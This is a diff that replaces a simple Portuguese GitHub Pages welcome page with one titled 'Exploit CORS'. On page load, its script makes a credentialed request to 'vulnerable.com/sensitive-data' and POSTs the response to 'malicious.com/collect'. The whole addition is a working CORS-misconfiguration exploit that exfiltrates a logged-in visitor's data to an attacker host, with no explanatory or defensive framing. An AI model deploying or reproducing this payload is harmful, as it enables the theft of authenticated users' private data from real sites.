@@ -1,10 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Minha Página Simples</title>
+    <title>Exploit CORS</title>
 </head>
 <body>
-    <h1>Bem-vindo ao meu site!</h1>
-    <p>Esta é uma página HTML simples hospedada no GitHub Pages.</p>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://vulnerable.com/sensitive-data', true);
+        xhr.withCredentials = true;
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                // Enviar dados para o servidor controlado
+                var exfiltrate = new XMLHttpRequest();
+                exfiltrate.open('POST', 'http://malicious.com/collect', true);
+                exfiltrate.setRequestHeader('Content-Type', 'application/json');
+                exfiltrate.send(JSON.stringify({data: xhr.responseText}));
+            }
+        };
+        xhr.send();
+    </script>
 </body>
 </html>
